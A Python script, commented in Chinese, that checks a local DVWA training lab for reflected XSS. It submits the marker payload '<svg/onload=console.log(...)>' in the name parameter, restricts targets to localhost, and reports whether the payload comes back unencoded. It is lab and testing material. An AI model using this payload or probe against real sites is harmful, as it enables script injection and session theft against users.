#!/usr/bin/env python3
"""无害XSS验证草案：向本地授权靶场提交反射型 name 参数并回读反射结果。
仅允许 localhost/127.0.0.1/::1；不跟随重定向；不读取、不打印 Cookie 值。
"""
import argparse
import sys
import urllib.error
import urllib.parse
import urllib.request

ALLOWED_HOSTS = {"localhost", "127.0.0.1", "::1"}
DEFAULT_PAYLOAD = "<svg/onload=console.log('LLM_LAB_XSS')>"


class NoRedirect(urllib.request.HTTPRedirectHandler):
    """拒绝自动跟随重定向，便于区分认证跳转。"""

    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def build_url(base, path, param, payload):
    query = urllib.parse.urlencode({param: payload})
    return base.rstrip("/") + "/" + path.lstrip("/") + "?" + query


def main():
    parser = argparse.ArgumentParser(description="本地授权靶场反射型XSS无害验证草案")
    parser.add_argument("--base", default="http://127.0.0.1", help="靶场基址，仅允许本地主机")
    parser.add_argument("--path", default="/dvwa/vulnerabilities/xss_r/", help="反射型XSS页面路径")
    parser.add_argument("--param", default="name", help="GET 参数名")
    parser.add_argument("--payload", default=DEFAULT_PAYLOAD, help="无害标记载荷")
    parser.add_argument("--cookie", default=None, help="可选会话 Cookie，从环境变量或本地文件读取，勿写入版本库")
    parser.add_argument("--timeout", type=float, default=10.0, help="请求超时秒数")
    args = parser.parse_args()

    parsed = urllib.parse.urlparse(args.base)
    if parsed.scheme not in ("http", "https"):
        sys.exit("协议不支持：仅允许 http/https")
    if parsed.hostname not in ALLOWED_HOSTS:
        sys.exit("主机不在本地白名单：%s" % parsed.hostname)

    url = build_url(args.base, args.path, args.param, args.payload)
    request = urllib.request.Request(url, headers={"User-Agent": "llm-lab-xss-check/1.0"})
    if args.cookie:
        request.add_header("Cookie", args.cookie)
    opener = urllib.request.build_opener(NoRedirect)

    try:
        with opener.open(request, timeout=args.timeout) as response:
            status = response.status
            body = response.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as exc:
        body = ""
        status = exc.code
        if 300 <= exc.code < 400:
            print("收到重定向（%d）：会话可能失效，需人工登录并取得新 Cookie 后重试" % exc.code)
        else:
            print("HTTP 错误：%d" % exc.code)
    except urllib.error.URLError as exc:
        sys.exit("连接错误：%s" % exc.reason)
    except TimeoutError:
        sys.exit("请求超时：%s 秒内未响应" % args.timeout)

    print("HTTP 状态：%d" % status)
    print("响应含未编码载荷：%s" % (args.payload in body))
    print("响应含实体编码痕迹（&lt;svg 或 &#60;）：%s" % ("&lt;svg" in body or "&#60;" in body))
    index = body.find(args.payload)
    if index >= 0:
        start = max(0, index - 120)
        print("回显上下文：")
        print(body[start:index + len(args.payload) + 120])
    print("提示：HTTP 回读只证明输入被反射；脚本是否执行须在浏览器打开同一 URL，观察控制台输出 LLM_LAB_XSS。")


if __name__ == "__main__":
    main()
